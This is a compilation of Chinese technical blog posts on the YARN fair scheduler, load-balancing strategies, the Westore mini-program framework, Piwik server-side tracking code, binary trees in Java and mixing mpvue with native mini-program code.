之所以要关注这个参数，是因为EMR很多客户在使用公平队列时会反映集群的总资源没有用满，但是还有APP在排队，没有跑起来，如下图所示：
图（6） APP阻塞实例
公平调度默认策略不关心Core的资源，只关心Memory。图中Memory用了292G，还有53.6G的内存没用，APP就可以阻塞。原因就是default队列所有运行中APP的AM资源总和超过了（345.6 * 0.5），导致APP阻塞。
总结
通过分析fair share的计算流程，搞清楚yarn的基本概念和部分参数，从下面的表格对比中，我们也可以看到官方的文档对概念和参数的描述是比较难懂的。剩余的参数放在第二篇-公平调度之抢占中分析。




官方描述
总结




Steady Fair Share
The queue’s steady fair share of resources. These shares consider all the queues irrespective of whether they are active (have running applications) or not. These are computed less frequently and change only when the configuration or capacity changes.They are meant to provide visibility into resources the user can expect, and hence displayed in the Web UI.
每个非fixed队列内存资源量的固定理论值。Steady Fair Share在RM初期工作后不再轻易改变，只有后续在增加节点改编配置（addNode）时才会重新计算。RM的初期工作也是handle线程把集群的每个节点添加到调度器中（addNode）。


Instantaneous Fair Share
The queue’s instantaneous fair share of resources. These shares consider only actives queues (those with running applications), and are used for scheduling decisions. Queues may be allocated resources beyond their shares when other queues aren’t using them. A queue whose resource consumption lies at or below its instantaneous fair share will never have its containers preempted.
每个非fixed队列(活跃队列)的内存资源量的实际值，是在动态变化的，由update线程去定时更新队列的fair share。yarn里的fair share如果没有专门指代，都是指的的Instantaneous Fair Share。


yarn.scheduler.fair.update-interval-ms
The interval at which to lock the scheduler and recalculate fair shares, recalculate demand, and check whether anything is due for preemption. Defaults to 500 ms.
update线程的间隔时间，该线程的工作是1更新fair share，2检查是否需要抢占资源。


maxAMShare
limit the fraction of the queue’s fair share that can be used to run application masters. This property can only be used for leaf queues. For example, if set to 1.0f, then AMs in the leaf queue can take up to 100% of both the memory and CPU fair share. The value of -1.0f will disable this feature and the amShare will not be checked. The default value is 0.5f.
队列所有运行中的APP的AM资源总和必须不能超过maxAMShare * fair share




问答
如何将yarn 升级到特定版本？
相关阅读
Yarn与Mesos
Spark on Yarn | Spark，从入门到精通
YARN三大模块介绍
【每日课程推荐】机器学习实战！快速入门在线广告业务及CTR相应知识

此文已由作者授权腾讯云+社区发布，更多原文请点击
搜索关注公众号「云加社区」，第一时间获取技术干货，关注后回复1024 送你一份技术课程大礼包！
海量技术实践经验，尽在云加社区！

********************************************************************************************************************************************************************************************************
分布式系统关注点——仅需这一篇，吃透「负载均衡」妥妥的

本文长度为3426字，预计读完需1.2MB流量，建议阅读9分钟。

 
阅读目录





「负载均衡」是什么？
常用「负载均衡」策略图解
常用「负载均衡」策略优缺点和适用场景
用「健康探测」来保障高可用
结语





 
 
　　上一篇《分布式系统关注点——初识「高可用」》我们对「高可用」有了一个初步认识，其中认为「负载均衡」是「高可用」的核心工作。那么，本篇将通过图文并茂的方式，来描述出每一种负载均衡策略的完整样貌。
 
 

一、「负载均衡」是什么
        正如题图所示的这样，由一个独立的统一入口来收敛流量，再做二次分发的过程就是「负载均衡」，它的本质和「分布式系统」一样，是「分治」。
 
        如果大家习惯了开车的时候用一些导航软件，我们会发现，导航软件的推荐路线方案会有一个数量的上限，比如3条、5条。因此，其实本质上它也起到了一个类似「负载均衡」的作用，因为如果只能取Top3的通畅路线，自然拥堵严重的路线就无法推荐给你了，使得车流的压力被分摊到了相对空闲的路线上。
 
        在软件系统中也是一样的道理，为了避免流量分摊不均，造成局部节点负载过大（如CPU吃紧等），所以引入一个独立的统一入口来做类似上面的“导航”的工作。但是，软件系统中的「负载均衡」与导航的不同在于，导航是一个柔性策略，最终还是需要使用者做选择，而前者则不同。
 
        怎么均衡的背后是策略在起作用，而策略的背后是由某些算法或者说逻辑来组成的。比如，导航中的算法属于「路径规划」范畴，在这个范畴内又细分为「静态路径规划」和「动态路径规划」，并且，在不同的分支下还有各种具体计算的算法实现，如Dijikstra、A*等。同样的，在软件系统中的负载均衡，也有很多算法或者说逻辑在支撑着这些策略，巧的是也有静态和动态之分。
 
 

二、常用「负载均衡」策略图解
        下面来罗列一下日常工作中最常见的5种策略。
 
01  轮询
 
　　这是最常用也最简单策略，平均分配，人人都有、一人一次。大致的代码如下。
 

int  globalIndex = 0;   //注意是全局变量，不是局部变量。

try
{

    return servers[globalIndex];
}
finally
{
    globalIndex++;
    if (globalIndex == 3)
        globalIndex = 0;
}

 
02  加权轮询

        在轮询的基础上，增加了一个权重的概念。权重是一个泛化后的概念，可以用任意方式来体现，本质上是一个能者多劳思想。比如，可以根据宿主的性能差异配置不同的权重。大致的代码如下。
 

int matchedIndex = -1;
int total = 0;
for (int i = 0; i < servers.Length; i++)
{
      servers[i].cur_weight += servers[i].weight;//①每次循环的时候做自增（步长=权重值）
      total += servers[i].weight;//②将每个节点的权重值累加到汇总值中
      if (matchedIndex == -1 || servers[matchedIndex].cur_weight < servers[i].cur_weight) //③如果 当前节点的自增数 > 当前待返回节点的自增数，则覆盖。
      {
            matchedIndex = i;
      }
}

servers[matchedIndex].cur_weight -= total;//④被选取的节点减去②的汇总值，以降低下一次被选举时的初始权重值。
return servers[matchedIndex];

 
        这段代码的过程如下图的表格。"()"中的数字就是自增数，代码中的cur_weight。
 

 
        值得注意的是，加权轮询本身还有不同的实现方式，虽说最终的比例都是2：1：2。但是在请求送达的先后顺序上可以所有不同。比如「5-4，3，2-1」和上面的案例相比，最终比例是一样的，但是效果不同。「5-4，3，2-1」更容易产生并发问题，导致服务端拥塞，且这个问题随着权重数字越大越严重。例子：10：5：3的结果是「18-17-16-15-14-13-12-11-10-9，8-7-6-5-4，3-2-1」 
 
03  最少连接数

        这是一种根据实时的负载情况，进行动态负载均衡的方式。维护好活动中的连接数量，然后取最小的返回即可。大致的代码如下。
 

var matchedServer = servers.orderBy(e => e.active_conns).first();

matchedServer.active_conns += 1;

return matchedServer;

//在连接关闭时还需对active_conns做减1的动作。

 
04  最快响应

        这也是一种动态负载均衡策略，它的本质是根据每个节点对过去一段时间内的响应情况来分配，响应越快分配的越多。具体的运作方式也有很多，上图的这种可以理解为，将最近一段时间的请求耗时的平均值记录下来，结合前面的「加权轮询」来处理，所以等价于2：1：3的加权轮询。
 
        题外话：一般来说，同机房下的延迟基本没什么差异，响应时间的差异主要在服务的处理能力上。如果在跨地域（例：浙江->上海，还是浙江->北京）的一些请求处理中运用，大多数情况会使用定时「ping」的方式来获取延迟情况，因为是OSI的L3转发，数据更干净，准确性更高。
 
05  Hash法

        hash法的负载均衡与之前的几种不同在于，它的结果是由客户端决定的。通过客户端带来的某个标识经过一个标准化的散列函数进行打散分摊。
 
        上图中的散列函数运用的是最简单粗暴的「取余法」。
        题外话：散列函数除了取余之外，还有诸如「变基」、「折叠」、「平方取中法」等等，此处不做展开，有兴趣的小伙伴可自行查阅资料。
 
        另外，被求余的参数其实可以是任意的，只要最终转化成一个整数参与运算即可。最常用的应该是用来源ip地址作为参数，这样可以确保相同的客户端请求尽可能落在同一台服务器上。
 
 

三、常用「负载均衡」策略优缺点和适用场景
        我们知道，没有完美的事物，负载均衡策略也是一样。上面列举的这些最常用的策略也有各自的优缺点和适用场景，我稍作了整理，如下。
 

 
        这些负载均衡算法之所以常用也是因为简单，想要更优的效果，必然就需要更高的复杂度。比如，可以将简单的策略组合使用、或者通过更多维度的数据采样来综合评估、甚至是基于进行数据挖掘后的预测算法来做。
 
 

四、用「健康探测」来保障高可用
        不管是什么样的策略，难免会遇到机器故障或者程序故障的情况。所以要确保负载均衡能更好的起到效果，还需要结合一些「健康探测」机制。定时的去探测服务端是不是还能连上，响应是不是超出预期的慢。如果节点属于“不可用”的状态的话，需要将这个节点临时从待选取列表中移除，以提高可用性。一般常用的「健康探测」方式有3种。
 
01  HTTP探测
        使用Get/Post的方式请求服务端的某个固定的URL，判断返回的内容是否符合预期。一般使用Http状态码、response中的内容来判断。
 
02  TCP探测
        基于Tcp的三次握手机制来探测指定的IP + 端口。最佳实践可以借鉴阿里云的SLB机制，如下图。

▲图片来源于阿里云，版权归原作者所有
        值得注意的是，为了尽早释放连接，在三次握手结束后立马跟上RST来中断TCP连接。
 
03  UDP探测
        可能有部分应用使用的UDP协议。在此协议下可以通过报文来进行探测指定的IP + 端口。最佳实践同样可以借鉴阿里云的SLB机制，如下图。

▲图片来源于阿里云，版权归原作者所有
 
        结果的判定方式是：在服务端没有返回任何信息的情况下，默认正常状态。否则会返回一个ICMP的报错信息。
 
 

五、结语
        用一句话来概括负载均衡的本质是：

        将请求或者说流量，以期望的规则分摊到多个操作单元上进行执行。






        通过它可以实现横向扩展（scale out），将冗余的作用发挥为「高可用」。另外，还可以物尽其用，提升资源使用率。
 
 
相关文章：


分布式系统关注点——初识「高可用」












 
 
 
作者：Zachary（个人微信号：Zachary-ZF）
微信公众号（首发）：跨界架构师。<-- 点击后阅读热门文章，或右侧扫码关注 -->
定期发表原创内容：架构设计丨分布式系统丨产品丨运营丨一些深度思考。
********************************************************************************************************************************************************************************************************
小程序解决方案 Westore - 组件、纯组件、插件开发
数据流转
先上一张图看清 Westore 怎么解决小程序数据难以管理和维护的问题:

非纯组件的话，可以直接省去 triggerEvent 的过程，直接修改 store.data 并且 update，形成缩减版单向数据流。
Github: https://github.com/dntzhang/westore
组件
这里说的组件便是自定义组件，使用原生小程序的开发格式如下:

Component({
  properties: { },

  data: { },

  methods: { }
})
使用 Westore 之后:
import create from '../../utils/create'

create({
  properties: { },

  data: { },

  methods: { }
})
看着差别不大，但是区别：

Component 的方式使用 setData 更新视图
create 的方式直接更改 store.data 然后调用 update
create 的方式可以使用函数属性，Component 不可以，如：

export default {
  data: {
    firstName: 'dnt',
    lastName: 'zhang',
    fullName:function(){
      return this.firstName + this.lastName
    }
  }
}
绑定到视图:
<view>{{fullName}}</view>
小程序 setData 的痛点:

使用 this.data 可以获取内部数据和属性值，但不要直接修改它们，应使用 setData 修改
setData 编程体验不好，很多场景直接赋值更加直观方便
setData 卡卡卡慢慢慢，JsCore 和 Webview 数据对象来回传浪费计算资源和内存资源
组件间通讯或跨页通讯会把程序搞得乱七八糟，变得极难维护和扩展

没使用 westore 的时候经常可以看到这样的代码:

使用完 westore 之后:

上面两种方式也可以混合使用。
可以看到，westore 不仅支持直接赋值，而且 this.update 兼容了 this.setData 的语法，但性能大大优于 this.setData，再举个例子：
this.store.data.motto = 'Hello Westore'
this.store.data.b.arr.push({ name: 'ccc' })
this.update()
等同于
this.update({
  motto:'Hello Westore',
  [`b.arr[${this.store.data.b.arr.length}]`]:{name:'ccc'}
})
这里需要特别强调，虽然 this.update 可以兼容小程序的 this.setData 的方式传参，但是更加智能，this.update 会先 Diff 然后 setData。原理:

纯组件
常见纯组件由很多，如 tip、alert、dialog、pager、日历等，与业务数据无直接耦合关系。
组件的显示状态由传入的 props 决定，与外界的通讯通过内部 triggerEvent 暴露的回调。
triggerEvent 的回调函数可以改变全局状态，实现单向数据流同步所有状态给其他兄弟、堂兄、姑姑等组件或者其他页面。
Westore里可以使用 create({ pure: true }) 创建纯组件（当然也可以直接使用 Component），比如 ：

import create from '../../utils/create'

create({
  pure : true,
  
  properties: {
    text: {
      type: String,
      value: '',
      observer(newValue, oldValue) { }
    }
  },

  data: {
    privateData: 'privateData'
  },

  ready: function () {
    console.log(this.properties.text)
  },

  methods: {
    onTap: function(){
      this.store.data.privateData = '成功修改 privateData'
      this.update()
      this.triggerEvent('random', {rd:'成功发起单向数据流' + Math.floor( Math.random()*1000)})
    }
  }
})
需要注意的是，加上 pure : true 之后就是纯组件，组件的 data 不会被合并到全局的 store.data 上。
组件区分业务组件和纯组件，他们的区别如下：

业务组件与业务数据紧耦合，换一个项目可能该组件就用不上，除非非常类似的项目
业务组件通过 store 获得所需参数，通过更改 store 与外界通讯
业务组件也可以通过 props 获得所需参数，通过 triggerEvent 与外界通讯
纯组件与业务数据无关，可移植和复用
纯组件只能通过 props 获得所需参数，通过 triggerEvent 与外界通讯

大型项目一定会包含纯组件、业务组件。通过纯组件，可以很好理解单向数据流。
小程序插件

小程序插件是对一组 JS 接口、自定义组件或页面的封装，用于嵌入到小程序中使用。插件不能独立运行，必须嵌入在其他小程序中才能被用户使用；而第三方小程序在使用插件时，也无法看到插件的代码。因此，插件适合用来封装自己的功能或服务，提供给第三方小程序进行展示和使用。
插件开发者可以像开发小程序一样编写一个插件并上传代码，在插件发布之后，其他小程序方可调用。小程序平台会托管插件代码，其他小程序调用时，上传的插件代码会随小程序一起下载运行。

插件开发者文档
插件使用者文档

插件开发
Westore 提供的目录如下:
|--components
|--westore  
|--plugin.json  
|--store.js
创建插件:
import create from '../../westore/create-plugin'
import store from '../../store'

//最外层容器节点需要传入 store，其他组件不传 store
create(store, {
  properties:{
    authKey:{
      type: String,
      value: ''
    }
  },
  data: { list: [] },
  attached: function () {
    // 可以得到插件上声明传递过来的属性值
    console.log(this.properties.authKey)
    // 监听所有变化
    this.store.onChange = (detail) => {
      this.triggerEvent('listChange', detail)
    }
    // 可以在这里发起网络请求获取插件的数据
    this.store.data.list = [{
      name: '电视',
      price: 1000
    }, {
      name: '电脑',
      price: 4000
    }, {
      name: '手机',
      price: 3000
    }]

    this.update()

    //同样也直接和兼容 setData 语法
    this.update(
        { 'list[2].price': 100000 }
    )
  }
})
在你的小程序中使用组件：
<list auth-key="{{authKey}}" bind:listChange="onListChange" />
这里来梳理下小程序自定义组件插件怎么和使用它的小程序通讯:

通过 properties 传入更新插件，通过 properties 的 observer 来更新插件
通过 store.onChange 收集 data 的所有变更
通过 triggerEvent 来抛事件给使用插件外部的小程序

这么方便简洁还不赶紧试试 Westore插件开发模板 ！
特别强调
插件内所有组件公用的 store 和插件外小程序的 store 是相互隔离的。
原理
页面生命周期函数



名称
描述




onLoad
监听页面加载


onShow
监听页面显示


onReady
监听页面初次渲染完成


onHide
监听页面隐藏


onUnload
监听页面卸载



组件生命周期函数



名称
描述




created
在组件实例进入页面节点树时执行，注意此时不能调用 setData


attached
在组件实例进入页面节点树时执行


ready
在组件布局完成后执行，此时可以获取节点信息（使用 SelectorQuery ）


moved
在组件实例被移动到节点树另一个位置时执行


detached
在组件实例被从页面节点树移除时执行



由于开发插件时候的组件没有 this.page，所以 store 是从根组件注入，而且可以在 attached 提前注入:
export default function create(store, option) {
    let opt = store
    if (option) {
        opt = option
        originData = JSON.parse(JSON.stringify(store.data))
        globalStore = store
        globalStore.instances = []
        create.store = globalStore
    }

    const attached = opt.attached
    opt.attached = function () {
        this.store = globalStore
        this.store.data = Object.assign(globalStore.data, opt.data)
        this.setData.call(this, this.store.data)
        globalStore.instances.push(this)
        rewriteUpdate(this)
        attached && attached.call(this)
    }
    Component(opt)
}
总结

组件 - 对 WXML、WXSS 和 JS 的封装，与业务耦合，可复用，难移植
纯组件 - 对 WXML、WXSS 和 JS 的封装，与业务解耦，可复用，易移植
插件 - 小程序插件是对一组 JS 接口、自定义组件或页面的封装，与业务耦合，可复用

Star & Fork 小程序解决方案
https://github.com/dntzhang/westore
License
MIT @dntzhang

********************************************************************************************************************************************************************************************************
开源网站流量统计系统Piwik源码分析——后台处理（二）
　　在第一篇文章中，重点介绍了脚本需要搜集的数据，而本篇主要介绍的是服务器端如何处理客户端发送过来的请求和参数。
一、设备信息检测
　　通过分析User-Agent请求首部（如下图红线框出的部分），可以得到相关的设备信息。
 
　　Piwik系统专门有一套代码用来分析代理信息，还独立了出来，叫做DeviceDetector。它有一个专门的demo页面，可以展示其功能，点进去后可以看到下图中的内容。

　　它能检测出浏览器名称、浏览器的渲染引擎、浏览器的版本、设备品牌（例如HTC、Apple、HP等）、设备型号（例如iPad、Nexus 5、Galaxy S5等）、设备类别（例如desktop、smartphone、tablet等），这6类数据中的可供选择的关键字，可以参考“List of segments”或插件的“readme”。顺便说一下，Piwik还能获取到访客的定位信息，在“List of segments”中，列举出了城市、经纬度等信息，其原理暂时还没研究。
　　Piwik为大部分设备信息的关键字配备了一个icon图标，所有的icon图标被放置在“plugins\Morpheus\icons”中，包括浏览器、设备、国旗、操作系统等，下图截取的是浏览器中的部分图标。

二、IP地址
　　在Piwik系统的后台设置中，可以选择IP地址的获取方式（如下图所示）。在官方博客的一篇《Geo Locate your visitors》博文中提到，3.5版本后可以在系统中嵌入MaxMind公司提供的IP地理定位服务（GeoIP2）。

　　下面是一张看官方的产品介绍表，从描述中可看出这是一项非常厉害的服务。不过需要注意的是，这是一项付费服务。

三、日志数据和归档数据
　　在官方发布的说明文档《How Matomo (formerly Piwik) Works》中提到，在Piwik中有两种数据类型：日志数据和归档数据。日志数据（Log Data）是一种原始分析数据，从客户端发送过来的参数就是日志数据，刚刚设备检测到的信息也是日志数据，还有其它的一些日志数据的来源，暂时还没细究。由于日志数据非常巨大，因此不能直接生成最终用户可看的报告，得使用归档数据来生成报告。归档数据（Archive Data）是以日志数据为基础而构建出来的，它是一种被缓存并且可用于生成报告的聚合分析数据。
　　日志数据会通过“core\Piwik\Tracker\Visit.php”中的方法保存到数据库中，其中核心的方法如下所示，注释中也强调了该方法中的内容是处理请求的主要逻辑。该方法涉及到了很多对象，以及对象的方法，错综复杂，我自己也没有研究透，只是利用PHPStorm编辑器自动索引，查找出了一些关联，具体细节还有待考证。

/**
 *  Main algorithm to handle the visit.
 *
 *  Once we have the visitor information, we have to determine if the visit is a new or a known visit.
 *
 * 1) When the last action was done more than 30min ago,
 *      or if the visitor is new, then this is a new visit.
 *
 * 2) If the last action is less than 30min ago, then the same visit is going on.
 *    Because the visit goes on, we can get the time spent during the last action.
 *
 * NB:
 *  - In the case of a new visit, then the time spent
 *    during the last action of the previous visit is unknown.
 *
 *    - In the case of a new visit but with a known visitor,
 *    we can set the 'returning visitor' flag.
 *
 * In all the cases we set a cookie to the visitor with the new information.
 */
public function handle() {
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::manipulateRequest()...");
        $processor->manipulateRequest($this->request);
    }
    $this->visitProperties = new VisitProperties();
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::processRequestParams()...");
        $abort = $processor->processRequestParams($this->visitProperties, $this->request);
        if ($abort) {
            Common::printDebug("-> aborting due to processRequestParams method");
            return;
        }
    }
    $isNewVisit = $this->request->getMetadata('CoreHome', 'isNewVisit');
    if (!$isNewVisit) {
        $isNewVisit = $this->triggerPredicateHookOnDimensions($this->getAllVisitDimensions() , 'shouldForceNewVisit');
        $this->request->setMetadata('CoreHome', 'isNewVisit', $isNewVisit);
    }
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::afterRequestProcessed()...");
        $abort = $processor->afterRequestProcessed($this->visitProperties, $this->request);
        if ($abort) {
            Common::printDebug("-> aborting due to afterRequestProcessed method");
            return;
        }
    }
    $isNewVisit = $this->request->getMetadata('CoreHome', 'isNewVisit');
    // Known visit when:
    // ( - the visitor has the Piwik cookie with the idcookie ID used by Piwik to match the visitor
    //   OR
    //   - the visitor doesn't have the Piwik cookie but could be match using heuristics @see recognizeTheVisitor()
    // )
    // AND
    // - the last page view for this visitor was less than 30 minutes ago @see isLastActionInTheSameVisit()
    if (!$isNewVisit) {
        try {
            $this->handleExistingVisit($this->request->getMetadata('Goals', 'visitIsConverted'));
        }
        catch(VisitorNotFoundInDb $e) {
            $this->request->setMetadata('CoreHome', 'visitorNotFoundInDb', true); // TODO: perhaps we should just abort here?
            
        }
    }
    // New visit when:
    // - the visitor has the Piwik cookie but the last action was performed more than 30 min ago @see isLastActionInTheSameVisit()
    // - the visitor doesn't have the Piwik cookie, and couldn't be matched in @see recognizeTheVisitor()
    // - the visitor does have the Piwik cookie but the idcookie and idvisit found in the cookie didn't match to any existing visit in the DB
    if ($isNewVisit) {
        $this->handleNewVisit($this->request->getMetadata('Goals', 'visitIsConverted'));
    }
    // update the cookie with the new visit information
    $this->request->setThirdPartyCookie($this->request->getVisitorIdForThirdPartyCookie());
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::recordLogs()...");
        $processor->recordLogs($this->visitProperties, $this->request);
    }
    $this->markArchivedReportsAsInvalidIfArchiveAlreadyFinished();
}

 　　最后了解一下Piwik的数据库设计，此处只分析与日志数据和归档数据有关的数据表。官方的说明文档曾介绍，日志数据有5张相关的数据表，我对于表的内在含义还比较模糊，因此下面所列的描述还不是很清晰。
（1）log_visit：每次访问都会生成一条访问者记录，表中的字段可参考“Visits”。
（2）log_action：网站上的访问和操作类型（例如特定URL、网页标题），可分析出访问者感兴趣的页面，表中的字段可参考“Action Types”。
（3）log_link_visit_action：访问者在浏览期间执行的操作，表中的字段可参考“Visit Actions”。
（4）log_conversion：访问期间发生的转化（与目标相符的操作），表中的字段可参考“Conversions”。
（5）log_conversion_item：与电子商务相关的信息，表中的字段可参考“Ecommerce items”。
　　归档数据的表有两种前缀，分别是“archive_numeric_”和“archive_blob_”，表的字段可参考“Archive data”。通过对字段的观察可知，两种最大的不同就是value字段的数据类型。archive_numeric_* 表中的value能储存数值（数据类型是Double），而archive_blob_* 表中的value能储存出数字以外的其他任何数据（数据类型是Blob）。
　　两种表都是动态生成的，因此前缀的后面都用“*”表示。生成规则可按年、月、周、天或自定义日期范围，不设置的话，默认是按月计算，例如archive_numeric_2018_09、archive_blob_2018_09。
 
参考资料：
开源网站分析软件Piwik的数据库表结构
Piwik运转原理
How Matomo (formerly Piwik) Works
Database schema
数据分析技术白皮书
What data does Matomo track?
Segmentation in the API
device-detector
Device Detector demo page
Geo Locate your visitors
 
********************************************************************************************************************************************************************************************************
Android版数据结构与算法(六):树与二叉树
版权声明：本文出自汪磊的博客，未经作者允许禁止转载。
 之前的篇章主要讲解了数据结构中的线性结构，所谓线性结构就是数据与数据之间是一对一的关系，接下来我们就要进入非线性结构的世界了，主要是树与图，好了接下来我们将会了解到树以及二叉树，二叉平衡树，赫夫曼树等原理以及java代码的实现，先从最基础的开始学习吧。
一、树
树的定义：
树是n(n>=0)个结点的有限集合。
当n=0时，集合为空,称为空树。
在任意一颗非空树中，有且仅有一个特定的结点称为根。
当n>1时,除根结点以外的其余结点可分成m(m>=0)个不相交的有限结点集合T1,T2….Tm.其中每个集合本身也是一棵树,称为根的子树。
如下图就是一棵树:

可以看到，树这种数据结构数据之间是一对一或者一对多关系，不再是一对一的关系
在上图中节点A叫做整棵树的根节点，一棵树中只有一个根节点。
根节点可以生出多个孩子节点，孩子节点又可以生出多个孩子节点。比如A的孩子节点为B和C，D的孩子节点为G，H，I。
每个孩子节点只有一个父节点，比如D的父节点为B，E的父节点为C。
好了，关于树的定义介绍到这，很简单。
二、树的相关术语

 
节点的度
节点含有的子树个数，叫做节点的度。度为0的节点成为叶子结点或终端结点。比如上图中D的度为3，E的度为1.
G,H,I,J的度为0，叫做叶子结点。
树的度
 一棵树中 最大节点的度树的度。比如上图中树的度为3
结点的层次
从根结点算起，为第一层，其余依次类推如上图。B,C的层次为2，G,H的层次为4。
树中节点的最大层次称为树的高度或深度。上图中树的高度或深度为4
三、树的存储结构
简单的顺序存储不能满足树的实现，需要结合顺序存储和链式存储来解决。
树的存储方式主要有三种：
双亲表示法：每个节点不仅保存自己数据还附带一个指示器指示其父节点的角标，这种方式可以用数组来存储。
如图：

这种存储方式特点是：查找一个节点的孩子节点会很麻烦但是查找其父节点很简单。
孩子表示法：每个节点不仅保存自己数据信息还附带指示其孩子的指示器，这种方式用链表来存储比较合适。
如图：

这种存储方式特点是：查找一个节点的父亲节点会很麻烦但是查找其孩子节点很简单。
理想表示法：数组+链表的存储方式，把每个结点的孩子结点排列起来，以单链表方式连接起来，则n个孩子有n个孩子链表，如果是叶子结点则此链表为空，然后n个头指针又组成线性表，采用顺序存储方式，存储在一个一维数组中。
如图：

这种方式查找父节点与孩子结点都比较简便。
以上主要介绍了树的一些概念以及存储方式介绍，实际我们用的更多的是二叉树，接下来我们看下二叉树。
四、二叉树的概念
二叉树定义：二叉树是n（n>=0）个结点的有限集合，该集合或者为空，或者由一个根结点和两课互不相交的，分别称为根结点左子树和右子树的二叉树组成。
用人话说，二叉树是每个节点至多有两个子树的树。
如图就是一颗二叉树：
 
 
五、特殊二叉树
斜树：所有结点只有左子树的二叉树叫做左斜树，所有结点只有右子树的二叉树叫做右斜树。
如图：

满二叉树：在一棵二叉树中，所有分支结点都有左子树与右子树，并且所有叶子结点都在同一层则为满二叉树。
如图：

完全二叉树：所有叶子节点都出现在 k 或者 k-1 层，而且从 1 到 k-1 层必须达到最大节点数，第 k 层可是不是慢的，但是第 k 层的所有节点必须集中在最左边。
如图：

 
 六、二叉树的遍历
二叉树的遍历主要有三种：先序遍历，中序遍历，后续遍历，接下来我们挨个了解一下。
先序遍历：先访问根结点，再先序遍历左子树，再先序遍历右子树。
如图所示：
 

先序遍历结果为：ABDGHCEIF
中序遍历：先中序遍历左子树，再访问根结点，再中序遍历右子树。
如图：

中序遍历结果为：GDHBAEICF
后序遍历：先后序遍历左子树，再后序遍历右子树，再访问根结点。
如图：

后序遍历结果：GHDBIEFCA
七、java实现二叉树
先来看看每个结点类：

 1     public class TreeNode{
 2         private String data;//自己结点数据
 3         private TreeNode leftChild;//左孩子
 4         private TreeNode rightChild;//右孩子
 5         
 6         public String getData() {
 7             return data;
 8         }
 9         
10         public void setData(String data) {
11             this.data = data;
12         }
13         
14         public TreeNode(String data){
15             this.data = data;
16             this.leftChild = null;
17             this.rightChild = null;
18         }
19     }

很简单，每个结点信息包含自己结点数据以及指向左右孩子的指针（为了方便，我这里就叫指针了）。
二叉树的创建
我们创建如下二叉树：

代码实现：

public class BinaryTree {
    private TreeNode  root = null;

    public TreeNode getRoot() {
        return root;
    }

    public BinaryTree(){
        root = new TreeNode("A");
    }
    
    /**
     * 构建二叉树
     *          A
     *     B        C
     *  D    E    F   G
     */
    public void createBinaryTree(){
        TreeNode nodeB = new TreeNode("B");
        TreeNode nodeC = new TreeNode("C");
        TreeNode nodeD = new TreeNode("D");
        TreeNode nodeE = new TreeNode("E");
        TreeNode nodeF = new TreeNode("F");
        TreeNode nodeG = new TreeNode("G");
        root.leftChild = nodeB;
        root.rightChild = nodeC;
        nodeB.leftChild = nodeD;
        nodeB.rightChild = nodeE;
        nodeC.leftChild = nodeF;
        nodeC.rightChild = nodeG;
    }
        。。。。。。。
}

创建BinaryTree的时候就已经创建根结点A，createBinaryTree()方法中创建其余结点并且建立相应关系。
获得二叉树的高度
树中节点的最大层次称为树的高度，因此获得树的高度需要递归获取所有节点的高度，取最大值。

     /**
     * 求二叉树的高度
     * @author Administrator
     *
     */
    public int getHeight(){
        return getHeight(root);
    }
    
    private int getHeight(TreeNode node) {
        if(node == null){
            return 0;
        }else{
            int i = getHeight(node.leftChild);
            int j = getHeight(node.rightChild);
            return (i<j)?j+1:i+1;
        }
    }        

获取二叉树的结点数
获取二叉树结点总数，需要遍历左右子树然后相加

 1     /**
 2      * 获取二叉树的结点数
 3      * @author Administrator
 4      *
 5      */
 6     public int getSize(){
 7         return getSize(root);
 8     }
 9     
10     private int getSize(TreeNode node) {
11         if(node == null){
12             return 0;
13         }else{
14             return 1+getSize(node.leftChild)+getSize(node.rightChild);
15         }
16     }

二叉树的遍历
二叉树遍历分为前序遍历，中序遍历，后续遍历，主要也是递归思想，下面直接给出代码

    /**
     * 前序遍历——迭代
     * @author Administrator
     *
     */
    public void preOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            System.out.println("preOrder data:"+node.getData());
            preOrder(node.leftChild);
            preOrder(node.rightChild);
        }
    }

    /**
     * 中序遍历——迭代
     * @author Administrator
     *
     */
    public void midOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            midOrder(node.leftChild);
            System.out.println("midOrder data:"+node.getData());
            midOrder(node.rightChild);
        }
    }
    
    /**
     * 后序遍历——迭代
     * @author Administrator
     *
     */
    public void postOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            postOrder(node.leftChild);
            postOrder(node.rightChild);
            System.out.println("postOrder data:"+node.getData());
        }
    }

获取某一结点的父结点
获取结点的父节点也是递归思想，先判断当前节点左右孩子是否与给定节点信息相等，相等则当前结点即为给定结点的父节点，否则继续递归左子树，右子树。

 1 /**
 2      * 查找某一结点的父结点
 3      * @param data
 4      * @return
 5      */
 6     public TreeNode getParent(String data){
 7         //封装为内部结点信息
 8         TreeNode node = new TreeNode(data);
 9         //
10         if (root == null || node.data.equals(root.data)){
11             //根结点为null或者要查找的结点就为根结点，则直接返回null，根结点没有父结点
12             return null;
13         }
14         return getParent(root, node);//递归查找
15     }
16 
17     public TreeNode getParent(TreeNode subTree, TreeNode node) {
18 
19         if (null == subTree){//子树为null，直接返回null
20             return null;
21         }
22         //判断左或者右结点是否与给定结点相等，相等则此结点即为给定结点的父结点
23         if(subTree.leftChild.data.equals(node.data) || subTree.rightChild.data.equals(node.data)){
24             return subTree;
25         }
26         //以上都不符合，则递归查找
27         if (getParent(subTree.leftChild,node)!=null){//先查找左子树，左子树找不到查询右子树
28             return getParent(subTree.leftChild,node);
29         }else {
30             return getParent(subTree.rightChild,node);
31         }
32     }

八、总结
以上总结了树与二叉树的一些概念，重点就是二叉树的遍历以及java代码实现，比较简单，没什么多余解释，下一篇了解一下赫夫曼树以及二叉排序树。
********************************************************************************************************************************************************************************************************
小程序开发总结一：mpvue框架及与小程序原生的混搭开发
mpvue-native:小程序原生和mpvue代码共存
问题描述
mpvue和wepy等框架是在小程序出来一段时间之后才开始有的，所以会出现的问题有：需要兼容已有的老项目，有些场景对小程序的兼容要求特别高的时候需要用原生的方式开发
解决思路

mpvue的入口文件导入旧版路由配置文件
公共样式 字体图标迁移 app.wxss -> app.vue中less（mpvue的公共样式）
旧项目导入 旧项目(native)拷贝到dist打包的根目录


这个要注意的就是拷贝的旧项目不能覆盖mpvue打包文件，只要避免文件夹名字冲突即可

mpvue-native使用
